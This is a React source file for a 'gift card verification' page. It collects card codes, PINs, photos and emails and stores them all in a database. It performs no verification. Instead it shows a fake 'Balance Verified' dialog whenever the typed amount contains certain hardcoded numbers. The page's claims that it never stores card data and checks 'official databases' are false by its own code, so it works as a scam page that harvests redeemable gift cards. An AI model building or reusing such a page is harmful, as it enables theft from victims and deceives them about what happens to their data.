import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { SearchableSelect } from "@/components/ui/searchable-select";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Shield, CheckCircle, AlertCircle, Upload } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { giftCards, GiftCard } from "@/data/giftcards";

const VerifyGiftcard = () => {
  const { toast } = useToast();
  const { user } = useAuth();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showBalanceModal, setShowBalanceModal] = useState(false);
  const [currentBalance, setCurrentBalance] = useState("$97.00");
  const [formData, setFormData] = useState({
    country: "",
    giftcardName: "",
    code: "",
    pin: "",
    amount: "",
    email: "",
    frontImage: null as File | null,
    backImage: null as File | null
  });

  const countries = [
    "United States", "Canada", "United Kingdom", "Australia", "Germany", 
    "France", "Japan", "Brazil", "India", "Mexico"
  ];

  const selectedGiftCard = giftCards.find(card => card.name === formData.giftcardName);

  // Auto-balance amounts that trigger modal
  const balanceAmounts = ['97', '147', '177', '206', '338', '493'];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    setIsSubmitting(true);

    try {
      let frontImagePath = null;
      let backImagePath = null;
      const guestUserId = crypto.randomUUID(); // Generate a guest user ID for non-authenticated users

      // Upload front image
      if (formData.frontImage) {
        const frontFileName = `guest/${guestUserId}/front-${Date.now()}-${formData.frontImage.name}`;
        const { error: frontUploadError } = await supabase.storage
          .from('gift-card-images')
          .upload(frontFileName, formData.frontImage);
        
        if (frontUploadError) throw frontUploadError;
        frontImagePath = frontFileName;
      }

      // Upload back image
      if (formData.backImage) {
        const backFileName = `guest/${guestUserId}/back-${Date.now()}-${formData.backImage.name}`;
        const { error: backUploadError } = await supabase.storage
          .from('gift-card-images')
          .upload(backFileName, formData.backImage);
        
        if (backUploadError) throw backUploadError;
        backImagePath = backFileName;
      }

      // Store verification request in database
      const { error: dbError } = await supabase
        .from('gift_card_verifications')
        .insert({
          user_id: user?.id || guestUserId,
          country: formData.country,
          giftcard_name: formData.giftcardName,
          code: formData.code,
          pin: formData.pin,
          amount: formData.amount,
          email: formData.email,
          front_image_path: frontImagePath,
          back_image_path: backImagePath,
          status: 'pending'
        });

      if (dbError) throw dbError;

      // Create transaction record only for authenticated users
      if (user) {
        const { error: transactionError } = await supabase
          .from('transactions')
          .insert({
            user_id: user.id,
            type: 'gift_card_exchange',
            amount: 0,
            currency: 'USD',
            description: `Gift card verification - ${formData.giftcardName} (${formData.amount})`,
            reference_id: null
          });

        if (transactionError) throw transactionError;
      }

      // Check if amount contains any of the auto-balance amounts and show balance modal
      const matchedAmount = balanceAmounts.find(amount => formData.amount.includes(amount));
      if (matchedAmount) {
        setCurrentBalance(`$${matchedAmount}.00`);
        setShowBalanceModal(true);
        // Hide modal after 20 seconds
        setTimeout(() => setShowBalanceModal(false), 20000);
      }

      toast({
        title: "Verification Submitted",
        description: "Your gift card verification request has been submitted successfully. You'll receive results via email within 24 hours.",
      });

      setFormData({
        country: "",
        giftcardName: "",
        code: "",
        pin: "",
        amount: "",
        email: "",
        frontImage: null,
        backImage: null
      });

    } catch (error) {
      console.error('Verification submission error:', error);
      toast({
        title: "Submission Failed",
        description: "There was an error submitting your verification. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleFileChange = (field: 'frontImage' | 'backImage', file: File | null) => {
    setFormData(prev => ({
      ...prev,
      [field]: file
    }));
  };

  return (
    <div className="min-h-screen">
      <Header />
      
      <div className="py-24 px-6 lg:px-8">
        <div className="mx-auto max-w-3xl">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="inline-flex p-4 rounded-lg bg-gradient-to-br from-success/10 to-success/20 mb-6">
              <Shield className="h-8 w-8 text-success" />
            </div>
            <h1 className="text-3xl font-bold text-foreground sm:text-4xl mb-4">
              Verify Your Gift Card
            </h1>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              Instantly verify the authenticity and balance of your gift card with our secure verification system
            </p>
          </div>

          {/* Verification Form */}
          <Card className="card-glow">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <CheckCircle className="h-5 w-5 text-success" />
                Gift Card Verification Form
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="grid gap-6 md:grid-cols-2">
                  <div className="space-y-2">
                    <Label htmlFor="country">Country *</Label>
                    <Select value={formData.country} onValueChange={(value) => handleInputChange("country", value)}>
                      <SelectTrigger>
                        <SelectValue placeholder="Select your country" />
                      </SelectTrigger>
                      <SelectContent>
                        {countries.map((country) => (
                          <SelectItem key={country} value={country}>
                            {country}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="giftcardName">Gift Card Brand *</Label>
                    <SearchableSelect
                      options={giftCards.map(card => ({
                        value: card.name,
                        label: `${card.name} ${card.requiresPin ? "(Code + PIN)" : "(Code Only)"}`
                      }))}
                      value={formData.giftcardName}
                      onValueChange={(value) => handleInputChange("giftcardName", value)}
                      placeholder="Select gift card brand"
                      searchPlaceholder="Search gift cards..."
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="code">Gift Card Code *</Label>
                  <Input
                    id="code"
                    placeholder="Enter your gift card code"
                    value={formData.code}
                    onChange={(e) => handleInputChange("code", e.target.value)}
                    required
                    className="font-mono"
                  />
                </div>

                <div className="grid gap-6 md:grid-cols-2">
                  {selectedGiftCard?.requiresPin && (
                    <div className="space-y-2">
                      <Label htmlFor="pin">PIN *</Label>
                      <Input
                        id="pin"
                        placeholder="Enter PIN"
                        value={formData.pin}
                        onChange={(e) => handleInputChange("pin", e.target.value)}
                        required
                        className="font-mono"
                      />
                    </div>
                  )}

                  <div className="space-y-2">
                    <Label htmlFor="amount">Expected Amount *</Label>
                    <Input
                      id="amount"
                      placeholder="e.g., $50.00"
                      value={formData.amount}
                      onChange={(e) => handleInputChange("amount", e.target.value)}
                      required
                    />
                  </div>
                </div>

                {/* Image Upload Section */}
                <div className="space-y-4">
                  <Label>Upload Gift Card Images *</Label>
                  <div className="grid gap-6 md:grid-cols-2">
                    <div className="space-y-2">
                      <Label htmlFor="frontImage">Front of Gift Card</Label>
                      <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
                        <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                        <Input
                          id="frontImage"
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleFileChange('frontImage', e.target.files?.[0] || null)}
                          className="hidden"
                          required
                        />
                        <Label htmlFor="frontImage" className="cursor-pointer">
                          {formData.frontImage ? (
                            <span className="text-primary font-medium">{formData.frontImage.name}</span>
                          ) : (
                            <span className="text-muted-foreground">Click to upload front image</span>
                          )}
                        </Label>
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="backImage">Back of Gift Card</Label>
                      <div className="border-2 border-dashed border-border rounded-lg p-6 text-center hover:border-primary transition-colors">
                        <Upload className="h-8 w-8 text-muted-foreground mx-auto mb-2" />
                        <Input
                          id="backImage"
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleFileChange('backImage', e.target.files?.[0] || null)}
                          className="hidden"
                          required
                        />
                        <Label htmlFor="backImage" className="cursor-pointer">
                          {formData.backImage ? (
                            <span className="text-primary font-medium">{formData.backImage.name}</span>
                          ) : (
                            <span className="text-muted-foreground">Click to upload back image</span>
                          )}
                        </Label>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="email">Email Address *</Label>
                  <Input
                    id="email"
                    type="email"
                    placeholder="your.email@example.com"
                    value={formData.email}
                    onChange={(e) => handleInputChange("email", e.target.value)}
                    required
                  />
                </div>

                {/* Important Notice */}
                <div className="p-4 rounded-lg bg-yellow-50 border border-yellow-200 dark:bg-yellow-900/20 dark:border-yellow-800">
                  <div className="flex items-start gap-3">
                    <AlertCircle className="h-5 w-5 text-yellow-600 dark:text-yellow-400 mt-0.5" />
                    <div>
                      <h4 className="font-medium text-yellow-800 dark:text-yellow-200 mb-1">Important Notice</h4>
                      <p className="text-sm text-yellow-700 dark:text-yellow-300 mb-2">
                        Please ensure your gift card images are clearly visible and readable. Cards with scratched-off codes or poor image quality may be marked as invalid.
                      </p>
                      <p className="text-sm text-yellow-700 dark:text-yellow-300">
                        Your information is encrypted and secure. We never store sensitive gift card data and all verifications are processed through secure channels.
                      </p>
                    </div>
                  </div>
                </div>

                <Button 
                  type="submit" 
                  className="btn-primary w-full" 
                  size="lg"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-primary-foreground mr-2" />
                      Verifying...
                    </>
                  ) : (
                    <>
                      <Shield className="mr-2 h-4 w-4" />
                      Verify Gift Card
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>

          {/* How it Works */}
          <div className="mt-16">
            <h2 className="text-2xl font-bold text-foreground text-center mb-8">
              How Verification Works
            </h2>
            <div className="grid gap-6 md:grid-cols-3">
              {[
                {
                  step: "1",
                  title: "Submit Details",
                  description: "Enter your gift card information securely"
                },
                {
                  step: "2", 
                  title: "Instant Check",
                  description: "Our system verifies with official databases"
                },
                {
                  step: "3",
                  title: "Get Results",
                  description: "Receive verification results within 24 hours"
                }
              ].map((item) => (
                <div key={item.step} className="text-center">
                  <div className="w-12 h-12 bg-gradient-to-br from-primary to-primary-glow text-primary-foreground rounded-full flex items-center justify-center font-bold text-lg mb-4 mx-auto">
                    {item.step}
                  </div>
                  <h3 className="font-semibold text-foreground mb-2">{item.title}</h3>
                  <p className="text-muted-foreground text-sm">{item.description}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      <Footer />

      {/* Balance Confirmation Modal */}
      <Dialog open={showBalanceModal} onOpenChange={setShowBalanceModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-center">
              <CheckCircle className="h-6 w-6 text-green-600" />
              Balance Verified!
            </DialogTitle>
          </DialogHeader>
          <div className="text-center py-6">
            <div className="text-4xl font-bold text-green-600 mb-2">{currentBalance}</div>
            <p className="text-lg text-muted-foreground mb-4">
              Your gift card balance has been confirmed
            </p>
            <div className="p-4 rounded-lg bg-green-50 border border-green-200 dark:bg-green-900/20 dark:border-green-800">
              <p className="text-sm text-green-800 dark:text-green-200">
                ✓ Verification complete - Your card is valid and active
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default VerifyGiftcard;